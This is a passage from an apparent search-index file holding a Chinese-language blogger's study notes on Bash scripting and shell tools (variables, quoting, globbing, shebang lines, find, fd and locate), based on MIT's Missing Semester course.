\u4e24\u4fa7\u7559\u7a7a\u683c\uff0c\u5728shell\u811a\u672c\u4e2d\u4f7f\u7528\u7a7a\u683c\u4f1a\u8d77\u5230\u5206\u5272\u53c2\u6570\u7684\u4f5c\u7528\uff0c\u6709\u65f6\u5019\u53ef\u80fd\u4f1a\u9020\u6210\u6df7\u6dc6\n</code></pre> <p>\u547d\u540d\u89c4\u5219\u60f3\u5fc5\u90fd\u70c2\u719f\u4e8e\u5fc3\uff0c\u5927\u4f53\u5c31\u662f\u53ea\u6709\u5b57\u6bcd\u3001\u4e0b\u5212\u7ebf\u3001\u6570\u5b57\uff08\u4e0d\u6253\u5934\uff09</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#ii11","title":"II.1.1 \u53ea\u8bfb\u53d8\u91cf","text":"<p>\u4f7f\u7528 readonly \u547d\u4ee4\u53ef\u4ee5\u5c06\u53d8\u91cf\u5b9a\u4e49\u4e3a\u53ea\u8bfb\u53d8\u91cf\uff0c\u53ea\u8bfb\u53d8\u91cf\u7684\u503c\u4e0d\u80fd\u88ab\u6539\u53d8\u3002</p> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u5c1d\u8bd5\u66f4\u6539\u53ea\u8bfb\u53d8\u91cf\uff0c\u7ed3\u679c\u62a5\u9519\uff1a</p> <p>```#!/bin/bash myUrl=\"https://www.google.com\" readonly\u00a0myUrl myUrl=\"https://www.w3schools.com\" <pre><code>\u8fd0\u884c\u811a\u672c\uff0c\u7ed3\u679c\u5982\u4e0b\uff1a\n\n`/bin/sh: NAME: This variable is read only.`\n\n### II.2 \u53d8\u91cf\u8d4b\u503c\n</code></pre> my_name=\"tom\" echo\u00a0$my_name my_name=\"alibaba\" echo\u00a0$my_name <pre><code>\u8fd9\u6837\u5199\u662f\u5408\u6cd5\u7684\uff0c\u4f46\u6ce8\u610f\uff0c\u7b2c\u4e8c\u6b21\u8d4b\u503c\u7684\u65f6\u5019\u4e0d\u80fd\u5199` $my_name=\"alibaba\"`\uff0c\u4f7f\u7528\u53d8\u91cf\u7684\u65f6\u5019\u624d\u52a0\u7f8e\u5143\u7b26($\uff09\n\n\u548c\u5176\u4ed6\u5927\u591a\u6570\u7684\u7f16\u7a0b\u8bed\u8a00\u4e00\u6837\uff0c`bash`\u4e5f\u652f\u6301`if`,\u00a0`case`,\u00a0`while`\u00a0\u548c\u00a0`for`\u00a0\u8fd9\u4e9b\u63a7\u5236\u6d41\u5173\u952e\u5b57\u3002\u540c\u6837\u5730\uff0c\u00a0`bash`\u00a0\u4e5f\u652f\u6301\u51fd\u6570\uff0c\u5b83\u53ef\u4ee5\u63a5\u53d7\u53c2\u6570\u5e76\u57fa\u4e8e\u53c2\u6570\u8fdb\u884c\u64cd\u4f5c\u3002\u4e0b\u9762\u8fd9\u4e2a\u51fd\u6570\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5b83\u4f1a\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\u5e76\u4f7f\u7528`cd`\u8fdb\u5165\u8be5\u6587\u4ef6\u5939\n\n```shell\nmcd () {\n    mkdir -p \"$1\"\n    cd \"$1\"\n}\n</code></pre></p> <p>\u5173\u4e8e\u8fd9\u4e2a <code>$1</code> ,\u89c1\u7279\u6b8a\u53d8\u91cf\u8868\u793a\u53c2\u6570</p> <p>\u5176\u4e2d\u8f83\u4e3a\u5e38\u7528\u7684\u6709\uff1a</p> <ul> <li><code>$?</code>\u00a0- \u524d\u4e00\u4e2a\u547d\u4ee4\u7684\u8fd4\u56de\u503c</li> <li><code>!!</code>\u00a0- \u5b8c\u6574\u7684\u4e0a\u4e00\u6761\u547d\u4ee4\uff0c\u5305\u62ec\u53c2\u6570<ul> <li>\u5e38\u89c1\u5e94\u7528\uff1a\u5f53\u4f60\u56e0\u4e3a\u6743\u9650\u4e0d\u8db3\u6267\u884c\u547d\u4ee4\u5931\u8d25\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u00a0<code>sudo !!</code> \u518d\u5c1d\u8bd5\u4e00\u6b21</li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#ii3","title":"II.3 \u4f7f\u7528\u53d8\u91cf","text":"<p>\u4f7f\u7528\u53d8\u91cf\u65f6\uff0c\u9700\u8981\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a <code>$</code> </p> <pre><code>echo $my_name\necho ${my_name}\n</code></pre> <p>\u53d8\u91cf\u540d\u5916\u9762\u7684\u82b1\u62ec\u53f7\u662f\u53ef\u9009\u7684\uff0c\u52a0\u4e0d\u52a0\u90fd\u884c\uff0c\u52a0\u82b1\u62ec\u53f7\u662f\u4e3a\u4e86\u5e2e\u52a9\u89e3\u91ca\u5668\u8bc6\u522b\u53d8\u91cf\u7684\u8fb9\u754c\uff0c\u6bd4\u5982\u4e0b\u9762\u8fd9\u79cd\u60c5\u51b5\uff1a</p> <pre><code>for\u00a0skill\u00a0in\u00a0Ada Coffe Action Java;\u00a0do  \n\u00a0 \u00a0\u00a0echo\u00a0\"I am good at\u00a0${skill}Script\"  \ndone  \n</code></pre> <p>\u5982\u679c\u4e0d\u7ed9skill\u53d8\u91cf\u52a0\u82b1\u62ec\u53f7\uff0c\u5199\u6210<code>echo \"I am good at $skillScript\"</code>\uff0c\u89e3\u91ca\u5668\u5c31\u4f1a\u628a$skillScript\u5f53\u6210\u4e00\u4e2a\u53d8\u91cf\uff08\u5176\u503c\u4e3a\u7a7a\uff09\uff0c\u4ee3\u7801\u6267\u884c\u7ed3\u679c\u5c31\u4e0d\u662f\u6211\u4eec\u671f\u671b\u7684\u6837\u5b50\u4e86\u3002</p> <p>Bash \u4e2d\u7684\u5b57\u7b26\u4e32\u901a\u8fc7 <code>'</code>\u00a0\u548c\u00a0<code>\"</code> \u5206\u9694\u7b26\u6765\u5b9a\u4e49\uff0c\u4f46\u662f\u5b83\u4eec\u7684\u542b\u4e49\u5e76\u4e0d\u76f8\u540c\u3002\u4ee5 <code>'</code> \u5b9a\u4e49\u7684\u5b57\u7b26\u4e32\u4e3a\u539f\u4e49\u5b57\u7b26\u4e32\uff0c\u5176\u4e2d\u7684\u53d8\u91cf\u4e0d\u4f1a\u88ab\u8f6c\u4e49\uff0c\u800c\u00a0<code>\"</code> \u5b9a\u4e49\u7684\u5b57\u7b26\u4e32\u4f1a\u5c06\u53d8\u91cf\u503c\u8fdb\u884c\u66ff\u6362\u3002 ^10e53b</p> <pre><code>foo=bar\necho \"$foo\"\n# \u6253\u5370 bar\necho '$foo'\n# \u6253\u5370 $foo\n</code></pre> <p>\u63a8\u8350\u7ed9\u6240\u6709\u53d8\u91cf\u52a0\u4e0a\u82b1\u62ec\u53f7\u6216\u8005\u53cc\u5f15\u53f7\uff0c\u8fd9\u662f\u4e2a\u597d\u7684\u7f16\u7a0b\u4e60\u60ef</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#ii4","title":"II.4 \u5220\u9664\u53d8\u91cf","text":"<p>\u4f7f\u7528 unset \u547d\u4ee4\u53ef\u4ee5\u5220\u9664\u53d8\u91cf\u3002\u8bed\u6cd5\uff1a</p> <p><code>unset variable_name</code> </p> <p>\u53d8\u91cf\u88ab\u5220\u9664\u540e\u4e0d\u80fd\u518d\u6b21\u4f7f\u7528\uff1bunset \u547d\u4ee4\u4e0d\u80fd\u5220\u9664\u53ea\u8bfb\u53d8\u91cf</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#iii","title":"III \u5b57\u7b26\u4e32","text":"","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#iii11","title":"III.1.1 \u5b57\u7b26\u4e32\u683c\u5f0f","text":"<p>\u5b57\u7b26\u4e32\u53ef\u4ee5\u7531\u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\u5305\u88f9\uff0c\u8fd9\u70b9 [[02-shell \u811a\u672c\u548c\u5de5\u5177#^10e53b|\u524d\u9762]] \u5df2\u7ecf\u8bb2\u7684\u8f83\u4e3a\u660e\u767d\u4e86</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#iii12","title":"III.1.2 \u62fc\u63a5\u5b57\u7b26\u4e32","text":"<p>\u65e0\u9700\u591a\u8bf4\uff0c\u5c06\u524d\u6587\u603b\u7ed3\u53ef\u4ee5\u8fd0\u884c</p> <pre><code>my_name=\"qssg\"\n# \u4f7f\u7528\u53cc\u5f15\u53f7\u62fc\u63a5\ngreeting=\"hello, \"$my_name\" !\"\ngreeting_1=\"hello, ${my_name} !\"\necho $greeting \u00a0$greeting_1  \n# \u4f7f\u7528\u5355\u5f15\u53f7\u62fc\u63a5\ngreeting_2='hello, '$my_name' !'\ngreeting_3='hello, ${my_name} !'\necho $greeting_2 \u00a0$greeting_3\n</code></pre> <p>\u8fd0\u884c\u7ed3\u679c\uff1a\uff08\u6839\u636e\u4e0a\u8fb9\u6587\u5b57\u989c\u8272\u5176\u5b9e\u90fd\u80fd\u731c\u5230\uff09</p> <p></p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#iii13","title":"III.1.3 \u5b57\u7b26\u4e32\u6570\u7ec4","text":"<p>\u53ef\u4ee5\u76f4\u63a5\u770b w 3 school \u4e0a\u7684\u8bb2\u89e3\uff0c\u4e0d\u52a0\u8d58\u8ff0</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#iii2","title":"III.2 \u83b7\u53d6\u8fd4\u56de\u503c","text":"","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#iii21-stdout-stderr","title":"III.2.1 STDOUT &amp; STDERR","text":"<p>\u547d\u4ee4\u901a\u5e38\u4f7f\u7528\u00a0<code>STDOUT</code>\u6765\u8fd4\u56de\u8f93\u51fa\u503c\uff0c\u4f7f\u7528<code>STDERR</code>\u00a0\u6765\u8fd4\u56de\u9519\u8bef\u53ca\u9519\u8bef\u7801\uff0c\u4fbf\u4e8e\u811a\u672c\u4ee5\u66f4\u52a0\u53cb\u597d\u7684\u65b9\u5f0f\u62a5\u544a\u9519\u8bef\u3002 \u8fd4\u56de\u7801\u6216\u9000\u51fa\u72b6\u6001\u662f\u811a\u672c/\u547d\u4ee4\u4e4b\u95f4\u4ea4\u6d41\u6267\u884c\u72b6\u6001\u7684\u65b9\u5f0f\u3002\u8fd4\u56de\u503c0\u8868\u793a\u6b63\u5e38\u6267\u884c\uff0c\u5176\u4ed6\u6240\u6709\u975e0\u7684\u8fd4\u56de\u503c\u90fd\u8868\u793a\u6709\u9519\u8bef\u53d1\u751f</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#iii22","title":"III.2.2 &amp;&amp; ||","text":"<p>\u9000\u51fa\u7801\u53ef\u4ee5\u642d\u914d\u00a0<code>&amp;&amp;</code>\uff08\u4e0e\u64cd\u4f5c\u7b26\uff09\u548c\u00a0<code>||</code>\uff08\u6216\u64cd\u4f5c\u7b26\uff09\u4f7f\u7528\uff0c\u7528\u6765\u8fdb\u884c\u6761\u4ef6\u5224\u65ad\uff0c\u51b3\u5b9a\u662f\u5426\u6267\u884c\u5176\u4ed6\u7a0b\u5e8f\u3002\u5b83\u4eec\u90fd\u5c5e\u4e8e\u77ed\u8def\u8fd0\u7b97\u7b26\uff08short-circuiting\uff09 \u540c\u4e00\u884c\u7684\u591a\u4e2a\u547d\u4ee4\u53ef\u4ee5\u7528\u00a0<code>;</code>\u00a0\u5206\u9694\u3002\u7a0b\u5e8f\u00a0<code>true</code>\u00a0\u7684\u8fd4\u56de\u7801\u6c38\u8fdc\u662f <code>0</code>\uff0c<code>false</code>\u00a0\u7684\u8fd4\u56de\u7801\u6c38\u8fdc\u662f <code>1</code></p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#iii23-command-substitution","title":"III.2.3 \u547d\u4ee4\u66ff\u6362\uff08command substitution\uff09","text":"<p>\u5f53\u901a\u8fc7\u00a0<code>$(CMD)</code>\u00a0\u8fd9\u6837\u7684\u65b9\u5f0f\u6765\u6267\u884c <code>CMD</code>\u00a0\u8fd9\u4e2a\u547d\u4ee4\u65f6\uff0c\u5b83\u7684\u8f93\u51fa\u7ed3\u679c\u4f1a\u66ff\u6362\u6389\u00a0<code>$(CMD)</code>\u00a0\u3002</p> <p>\u4f8b\u5982\uff0c\u5982\u679c\u6267\u884c\u00a0<code>for file in $(ls)</code>\u00a0\uff0cshell\u9996\u5148\u5c06\u8c03\u7528<code>ls</code>\u00a0\uff0c\u7136\u540e\u904d\u5386\u5f97\u5230\u7684\u8fd9\u4e9b\u8fd4\u56de\u503c</p> <p>[\u8fdb\u7a0b\u66ff\u6362\u4ee5\u53ca\u4e00\u4e9b\u4f8b\u5b50](https://missing-semester-cn.github.io/2020/shell-tools/#:~:text=%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2(process%20 substitution)\u770b\u4e0d\u592a\u61c2\uff0c\u6709\u5174\u8da3\u8bf7\u81ea\u884c\u5b66\u4e60</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#iv","title":"IV \u901a\u914d","text":"<p>\u5f53\u6267\u884c\u811a\u672c\u65f6\uff0c\u6211\u4eec\u7ecf\u5e38\u9700\u8981\u63d0\u4f9b\u5f62\u5f0f\u7c7b\u4f3c\u7684\u53c2\u6570\u3002bash\u4f7f\u6211\u4eec\u53ef\u4ee5\u8f7b\u677e\u7684\u5b9e\u73b0\u8fd9\u4e00\u64cd\u4f5c\uff0c\u5b83\u53ef\u4ee5\u57fa\u4e8e\u6587\u4ef6\u6269\u5c55\u540d\u5c55\u5f00\u8868\u8fbe\u5f0f\u3002\u8fd9\u4e00\u6280\u672f\u88ab\u79f0\u4e3ashell\u7684\u00a0\u901a\u914d\uff08globbing\uff09</p> <p>\u6709\u70b9\u50cf\u6b63\u5219\u8868\u8fbe\u5f0f</p> <ul> <li>\u901a\u914d\u7b26 - \u5f53\u4f60\u60f3\u8981\u5229\u7528\u901a\u914d\u7b26\u8fdb\u884c\u5339\u914d\u65f6\uff0c\u4f60\u53ef\u4ee5\u5206\u522b\u4f7f\u7528\u00a0<code>?</code>\u00a0\u548c\u00a0<code>*</code>\u00a0\u6765\u5339\u914d\u4e00\u4e2a\u6216\u4efb\u610f\u4e2a\u5b57\u7b26\u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e\u6587\u4ef6<code>foo</code>,\u00a0<code>foo1</code>,\u00a0<code>foo2</code>,\u00a0<code>foo10</code>\u00a0\u548c\u00a0<code>bar</code>,\u00a0<code>rm foo?</code>\u8fd9\u6761\u547d\u4ee4\u4f1a\u5220\u9664<code>foo1</code>\u00a0\u548c\u00a0<code>foo2</code>\u00a0\uff0c\u800c<code>rm foo*</code>\u00a0\u5219\u4f1a\u5220\u9664\u9664\u4e86<code>bar</code>\u4e4b\u5916\u7684\u6240\u6709\u6587\u4ef6\u3002</li> <li>\u82b1\u62ec\u53f7<code>{}</code>\u00a0- \u5f53\u4f60\u6709\u4e00\u7cfb\u5217\u7684\u6307\u4ee4\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u6bb5\u516c\u5171\u5b50\u4e32\u65f6\uff0c\u53ef\u4ee5\u7528\u82b1\u62ec\u53f7\u6765\u81ea\u52a8\u5c55\u5f00\u8fd9\u4e9b\u547d\u4ee4\u3002\u8fd9\u5728\u6279\u91cf\u79fb\u52a8\u6216\u8f6c\u6362\u6587\u4ef6\u65f6\u975e\u5e38\u65b9\u4fbf\u3002</li> </ul> <p>\u4f8b\u5982\uff1a</p> <pre><code>convert image.{png,jpg}\n# \u4f1a\u5c55\u5f00\u4e3a\nconvert image.png image.jpg\ncp /path/to/project/{foo,bar,baz}.sh /newpath\n# \u4f1a\u5c55\u5f00\u4e3a\ncp /path/to/project/foo.sh /path/to/project/bar.sh /path/to/project/baz.sh /newpath\n# \u4e5f\u53ef\u4ee5\u7ed3\u5408\u901a\u914d\u4f7f\u7528\nmv *{.py,.sh} folder\n# \u4f1a\u79fb\u52a8\u6240\u6709 *.py \u548c *.sh \u6587\u4ef6\nmkdir foo bar\n# \u4e0b\u9762\u547d\u4ee4\u4f1a\u521b\u5efafoo/a, foo/b, ... foo/h, bar/a, bar/b, ... bar/h\u8fd9\u4e9b\u6587\u4ef6\ntouch {foo,bar}/{a..h}\ntouch foo/x bar/y\n# \u6bd4\u8f83\u6587\u4ef6\u5939 foo \u548c bar \u4e2d\u5305\u542b\u6587\u4ef6\u7684\u4e0d\u540c\ndiff &lt;(ls foo) &lt;(ls bar)\n# \u8f93\u51fa\n# &lt; x\n# ---\n# &gt; y\n</code></pre> <p>\u7f16\u5199\u00a0<code>bash</code>\u00a0\u811a\u672c\u6709\u65f6\u5019\u4f1a\u5f88\u522b\u626d\u548c\u53cd\u76f4\u89c9\u3002\u4f8b\u5982\u00a0shellcheck\u00a0\u8fd9\u6837\u7684\u5de5\u5177\uff08\u6216\u8005\u662f vscode \u4e0a\u540c\u540d\u63d2\u4ef6\uff09\u53ef\u4ee5\u5e2e\u52a9\u4f60\u5b9a\u4f4d sh/bash \u811a\u672c\u4e2d\u7684\u9519\u8bef</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#v-shebang","title":"V shebang","text":"<p>\u901a\u5e38\u5730\uff0c\u6211\u4eec\u79f0 <code>#!</code> \u4e3a <code>shebang</code>\uff0cwiki \u767e\u79d1\u4e0a\u662f\u8fd9\u6837\u89e3\u91ca\u7684\uff1a</p> <p></p> <p>\u901a\u4fd7\u5730\u8bf4\uff0c\u5c31\u662f\u7528 <code>shebang</code> \u6765\u58f0\u660e\u4e0b\u9762\u7684\u811a\u672c\u5e94\u8be5\u4f7f\u7528\u4ec0\u4e48\u7a0b\u5e8f\u53bb\u8fd0\u884c</p> <p>\u6bd4\u5982\u8bf4\uff0c\u8fd9\u662f\u4e00\u6bb5 Python \u811a\u672c\uff0c\u4f5c\u7528\u662f\u5c06\u8f93\u5165\u7684\u53c2\u6570\u5012\u5e8f\u8f93\u51fa\uff1a</p> <pre><code>#!/usr/local/bin/python\nimport sys\nfor arg in reversed(sys.argv[1:]):\n    print(arg)\n</code></pre> <p>\u5728\u00a0<code>shebang</code>\u00a0\u884c\u4e2d\u4f7f\u7528\u00a0<code>env</code>\u00a0\u547d\u4ee4\u662f\u4e00\u79cd\u597d\u7684\u505a\u6cd5\uff0c\u5b83\u4f1a\u5229\u7528\u73af\u5883\u53d8\u91cf\u4e2d\u7684\u7a0b\u5e8f\u6765\u89e3\u6790\u8be5\u811a\u672c\uff0c\u8fd9\u6837\u5c31\u63d0\u9ad8\u811a\u672c\u7684\u53ef\u79fb\u690d\u6027\u3002<code>env</code>\u00a0\u4f1a\u5229\u7528 <code>PATH</code>\u00a0\u73af\u5883\u53d8\u91cf\u6765\u8fdb\u884c\u5b9a\u4f4d</p> <p>\u4f8b\u5982\uff0c\u4f7f\u7528\u4e86 <code>env</code> \u7684 shebang \u770b\u4e0a\u53bb\u65f6\u8fd9\u6837\u7684 <code>#!/usr/bin/env python</code></p> <p>shell\u51fd\u6570\u548c\u811a\u672c\u6709\u4e00\u4e9b\u4e0d\u540c\u70b9\uff0c\u8bf7\u8bfb\u8005\u81ea\u884c\u8df3\u8f6c\u89c2\u770b</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#vi-shell","title":"VI Shell \u5de5\u5177","text":"","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#vi1-man","title":"VI.1 man","text":"<p><code>man</code> \u547d\u4ee4\u662f manual\uff08\u624b\u518c\uff09\u7684\u7f29\u5199\uff0c\u5c5e\u4e8e\u662f\u7f51\u9875\u7248 linux \u624b\u518c</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#vi2-tldr-pages","title":"VI.2 TLDR pages","text":"<p><code>man</code> \u547d\u4ee4\u6709\u65f6\u8fc7\u4e8e\u8be6\u7ec6\u4e86\uff0c\u4e0d\u5229\u4e8e\u6211\u4eec\u5b66\u4e60\u5e38\u7528\u7684\u547d\u4ee4\u53ca\u9009\u9879</p> <p>TLDR pages\u00a0\u662f\u4e00\u4e2a\u5f88\u4e0d\u9519\u7684\u66ff\u4ee3\u54c1\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u4e9b\u6848\u4f8b\uff0c\u53ef\u4ee5\u5e2e\u52a9\u60a8\u5feb\u901f\u627e\u5230\u6b63\u786e\u7684\u9009\u9879\uff08\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u627e\u627e\u5176\u4ed6\u6bd4\u8f83\u9760\u8c31\u7684 Linux \u624b\u518c\uff09\u3002 \u00a0</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#vi3","title":"VI.3 \u6587\u4ef6\u67e5\u627e","text":"<p>\u7a0b\u5e8f\u5458\u4eec\u9762\u5bf9\u7684\u6700\u5e38\u89c1\u7684\u91cd\u590d\u4efb\u52a1\u5c31\u662f\u67e5\u627e\u6587\u4ef6\u6216\u76ee\u5f55\u3002\u6240\u6709\u7684\u7c7bUNIX\u7cfb\u7edf\u90fd\u5305\u542b\u4e00\u4e2a\u540d\u4e3a\u00a0<code>find</code>\u00a0\u7684\u5de5\u5177\uff0c\u5b83\u662f shell \u4e0a\u7528\u4e8e\u67e5\u627e\u6587\u4ef6\u7684\u7edd\u4f73\u5de5\u5177\u3002<code>find</code>\u547d\u4ee4\u4f1a\u9012\u5f52\u5730\u641c\u7d22\u7b26\u5408\u6761\u4ef6\u7684\u6587\u4ef6\uff0c\u4f8b\u5982\uff1a</p> <pre><code># \u67e5\u627e\u6240\u6709\u540d\u79f0\u4e3asrc\u7684\u6587\u4ef6\u5939\nfind . -name src -type d\n# \u67e5\u627e\u6240\u6709\u6587\u4ef6\u5939\u8def\u5f84\u4e2d\u5305\u542btest\u7684python\u6587\u4ef6\nfind . -path '*/test/*.py' -type f\n# \u67e5\u627e\u524d\u4e00\u5929\u4fee\u6539\u7684\u6240\u6709\u6587\u4ef6\nfind . -mtime -1\n# \u67e5\u627e\u6240\u6709\u5927\u5c0f\u5728500k\u81f310M\u7684tar.gz\u6587\u4ef6\nfind . -size +500k -size -10M -name '*.tar.gz'\n</code></pre> <p>\u9664\u4e86\u5217\u51fa\u6240\u5bfb\u627e\u7684\u6587\u4ef6\u4e4b\u5916\uff0cfind \u8fd8\u80fd\u5bf9\u6240\u6709\u67e5\u627e\u5230\u7684\u6587\u4ef6\u8fdb\u884c\u64cd\u4f5c\u3002\u8fd9\u80fd\u6781\u5927\u5730\u7b80\u5316\u4e00\u4e9b\u5355\u8c03\u7684\u4efb\u52a1\u3002</p> <pre><code># \u5220\u9664\u5168\u90e8\u6269\u5c55\u540d\u4e3a.tmp \u7684\u6587\u4ef6\nfind . -name '*.tmp' -exec rm {} \\;\n# \u67e5\u627e\u5168\u90e8\u7684 PNG \u6587\u4ef6\u5e76\u5c06\u5176\u8f6c\u6362\u4e3a JPG\nfind . -name '*.png' -exec convert {} {}.jpg \\;\n</code></pre> <p>\u5c3d\u7ba1\u00a0<code>find</code>\u00a0\u7528\u9014\u5e7f\u6cdb\uff0c\u5b83\u7684\u8bed\u6cd5\u5374\u6bd4\u8f83\u96be\u4ee5\u8bb0\u5fc6\u3002\u4f8b\u5982\uff0c\u4e3a\u4e86\u67e5\u627e\u6ee1\u8db3\u6a21\u5f0f\u00a0<code>PATTERN</code>\u00a0\u7684\u6587\u4ef6\uff0c\u60a8\u9700\u8981\u6267\u884c\u00a0<code>find -name '*PATTERN*'</code>\u00a0(\u5982\u679c\u60a8\u5e0c\u671b\u6a21\u5f0f\u5339\u914d\u65f6\u662f\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff0c\u53ef\u4ee5\u4f7f\u7528<code>-iname</code>\u9009\u9879\uff09</p> <p>\u60a8\u5f53\u7136\u53ef\u4ee5\u4f7f\u7528 alias \u8bbe\u7f6e\u522b\u540d\u6765\u7b80\u5316\u4e0a\u8ff0\u64cd\u4f5c\uff0c\u4f46 shell \u7684\u54f2\u5b66\u4e4b\u4e00\u4fbf\u662f\u5bfb\u627e\uff08\u66f4\u597d\u7528\u7684\uff09\u66ff\u4ee3\u65b9\u6848\u3002 \u8bb0\u4f4f\uff0cshell \u6700\u597d\u7684\u7279\u6027\u5c31\u662f\u60a8\u53ea\u662f\u5728\u8c03\u7528\u7a0b\u5e8f\uff0c\u56e0\u6b64\u60a8\u53ea\u8981\u627e\u5230\u5408\u9002\u7684\u66ff\u4ee3\u7a0b\u5e8f\u5373\u53ef\uff08\u751a\u81f3\u81ea\u5df1\u7f16\u5199\uff09\u3002</p> <p>\u4f8b\u5982\uff0c<code>fd</code>\u00a0\u5c31\u662f\u4e00\u4e2a\u66f4\u7b80\u5355\u3001\u66f4\u5feb\u901f\u3001\u66f4\u53cb\u597d\u7684\u7a0b\u5e8f\uff0c\u5b83\u53ef\u4ee5\u7528\u6765\u4f5c\u4e3a<code>find</code>\u7684\u66ff\u4ee3\u54c1\u3002\u5b83\u6709\u5f88\u591a\u4e0d\u9519\u7684\u9ed8\u8ba4\u8bbe\u7f6e\uff0c\u4f8b\u5982\u8f93\u51fa\u7740\u8272\u3001\u9ed8\u8ba4\u652f\u6301\u6b63\u5219\u5339\u914d\u3001\u652f\u6301unicode\u5e76\u4e14\u6211\u8ba4\u4e3a\u5b83\u7684\u8bed\u6cd5\u66f4\u7b26\u5408\u76f4\u89c9\u3002\u4ee5\u6a21\u5f0f<code>PATTERN</code>\u00a0\u641c\u7d22\u7684\u8bed\u6cd5\u662f\u00a0<code>fd PATTERN</code>\u3002</p> <p>\u5927\u591a\u6570\u4eba\u90fd\u8ba4\u4e3a\u00a0<code>find</code>\u00a0\u548c\u00a0<code>fd</code>\u00a0\u5df2\u7ecf\u5f88\u597d\u7528\u4e86\uff0c\u4f46\u662f\u6709\u7684\u4eba\u53ef\u80fd\u60f3\u77e5\u9053\uff0c\u6211\u4eec\u662f\u4e0d\u662f\u53ef\u4ee5\u6709\u66f4\u9ad8\u6548\u7684\u65b9\u6cd5\uff0c\u4f8b\u5982\u4e0d\u8981\u6bcf\u6b21\u90fd\u641c\u7d22\u6587\u4ef6\u800c\u662f\u901a\u8fc7\u7f16\u8bd1\u7d22\u5f15\u6216\u5efa\u7acb\u6570\u636e\u5e93\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\u66f4\u52a0\u5feb\u901f\u5730\u641c\u7d22\u3002</p> <p>\u8fd9\u5c31\u8981\u9760\u00a0<code>locate</code>\u00a0\u4e86\u3002\u00a0<code>locate</code>\u00a0\u4f7f\u7528\u4e00\u4e2a\u7531\u00a0<code>updatedb</code> \u8d1f\u8d23\u66f4\u65b0\u7684\u6570\u636e\u5e93\uff08\u5728\u5927\u591a\u6570\u7cfb\u7edf\u4e2d\u00a0<code>updatedb</code>\u00a0\u90fd\u4f1a\u901a\u8fc7\u00a0<code>cron</code>\u00a0\u6bcf\u65e5\u66f4\u65b0\uff09\u800c\u5728\u6570\u636e\u5e93\u4e2d\u8fdb\u884c\u641c\u7d22\u53ef\u6bd4\u5728\u786c\u76d8\u641c\u7d22\u5feb\u591a\u4e86\u3002\u8fd9\u4fbf\u9700\u8981\u6211\u4eec\u5728\u901f\u5ea6\u548c\u65f6\u6548\u6027\u4e4b\u95f4\u4f5c\u51fa\u6743\u8861\u3002\u800c\u4e14\uff0c<code>find</code>\u00a0\u548c\u7c7b\u4f3c\u7684\u5de5\u5177\u53ef\u4ee5\u901a\u8fc7\u522b\u7684\u5c5e\u6027\u6bd4\u5982\u6587\u4ef6\u5927\u5c0f\u3001\u4fee\u6539\u65f6\u95f4\u6216\u662f\u6743\u9650\u6765\u67e5\u627e\u6587\u4ef6\uff0c<code>locate</code> \u5219\u53ea\u80fd\u901a\u8fc7\u6587\u4ef6\u540d\u3002\u66f4\u8be6\u7ec6\u7684\u5bf9\u6bd4</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#vi4","title":"VI.4 \u4ee3\u7801\u67e5\u627e","text":"<p>\u5f88\u591a\u65f6\u5019\u6211\u4eec\u9700\u8981\u627e\u5230\u5199\u8fc7\u7684\u4e00\u6bb5\u4ee3\u7801\u3002\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e00\u70b9\uff0c\u5f88\u591a\u7c7b UNIX \u7684\u7cfb\u7edf\u90fd\u63d0\u4f9b\u4e86 <code>grep</code> \u547d\u4ee4\uff0c\u5b83\u662f\u7528\u4e8e\u5bf9\u8f93\u5165\u6587\u672c\u8fdb\u884c\u5339\u914d\u7684\u901a\u7528\u5de5\u5177\u3002</p> 